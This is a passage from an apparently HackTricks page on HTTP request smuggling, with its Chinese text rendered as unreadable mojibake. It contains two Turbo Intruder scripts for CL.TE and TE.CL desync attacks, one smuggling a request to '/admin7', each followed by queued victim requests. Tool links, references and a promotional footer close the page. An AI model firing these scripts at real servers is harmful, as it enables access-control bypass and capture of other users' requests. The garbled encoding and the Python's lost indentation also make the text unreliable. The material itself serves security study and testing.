_è¿™ç§æŠ€æœ¯çš„ä¸€ä¸ªé™åˆ¶æ˜¯é€šå¸¸åªèƒ½æ•è·ç›´åˆ°é€‚ç”¨äºä¸²è”è¯·æ±‚çš„å‚æ•°åˆ†éš”ç¬¦çš„æ•°æ®ã€‚å¯¹äºURLç¼–ç çš„è¡¨å•æäº¤ï¼Œè¿™å°†æ˜¯`&`å­—ç¬¦ï¼Œè¿™æ„å‘³ç€ä»å—å®³ç”¨æˆ·è¯·æ±‚ä¸­å­˜å‚¨çš„å†…å®¹å°†åœ¨ç¬¬ä¸€ä¸ª`&`å¤„ç»“æŸï¼Œç”šè‡³å¯èƒ½å‡ºç°åœ¨æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­ã€‚_

è¿˜è¦æ³¨æ„ï¼Œ**æ­¤æŠ€æœ¯ä¹Ÿå¯åˆ©ç”¨TE.CL**æ¼æ´ï¼Œä½†è¯·æ±‚å¿…é¡»ä»¥`search=\r\n0`ç»“å°¾ã€‚ä½†æ˜¯ï¼Œæ— è®ºæ–°è¡Œå­—ç¬¦å¦‚ä½•ï¼Œå€¼éƒ½å°†é™„åŠ åˆ°æœç´¢å‚æ•°ã€‚
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## æ›´å¤šä¿¡æ¯

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[è¿™é‡ŒæŸ¥çœ‹å›¾ç‰‡ã€‚](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## å·¥å…·

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): è¿™ä¸ªå·¥å…·æ˜¯åŸºäºè¯­æ³•çš„HTTP Fuzzerï¼Œç”¨äºå‘ç°å¥‡æ€ªçš„è¯·æ±‚æ¬ºéª—å·®å¼‚ã€‚

## å‚è€ƒ

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
